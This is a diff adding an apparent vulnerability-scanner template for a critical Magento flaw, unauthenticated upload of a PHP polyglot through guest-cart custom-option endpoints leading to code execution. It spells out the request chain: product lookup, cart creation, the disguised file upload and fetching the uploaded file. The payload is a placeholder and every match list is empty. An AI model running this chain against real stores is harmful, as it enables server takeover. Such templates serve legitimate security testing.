@@ -1,0 +1,41 @@
+id: magento-polyshell-rce
+brief:
+    title: Magento PolyShell – Unauthenticated File Upload to RCE
+    by: slcyber
+    level: critical
+    about: Magento lacks file type validation on custom product options file upload feature accessible via unauthenticated REST/GraphQL APIs. Attackers can upload arbitrary PHP files through guest cart endpoi...
+    label:
+        - magento
+        - file-upload
+        - rce
+        - intrusive
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/graphql'
+      head:
+        Content-Type: application/json
+      body: '{"query": "{ products(search: \"\", pageSize: 1) { items { sku } } }"}'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/rest/default/V1/guest-carts'
+      head:
+        Content-Type: application/json
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/rest/default/V1/guest-carts/{{cart_id}}/items'
+      head:
+        Content-Type: application/json
+      body: '{"cart_item":{"product_option":{"extension_attributes":{"custom_options":[{"extension_attributes":{"file_info":{"base64_encoded_data":"{{polyglot_b64}}","name":"{{php_filename}}","type":"image/png"}},"option_id":"12345","option_value":"file"}]}},"qty":1,"sku":"{{product_sku}}"}}'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/pub/media/custom_options/quote/{{upload_subdir1}}/{{upload_subdir2}}/{{upload_filename}}'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/media/custom_options/quote/{{upload_subdir1}}/{{upload_subdir2}}/{{upload_filename}}'
+      signs: []
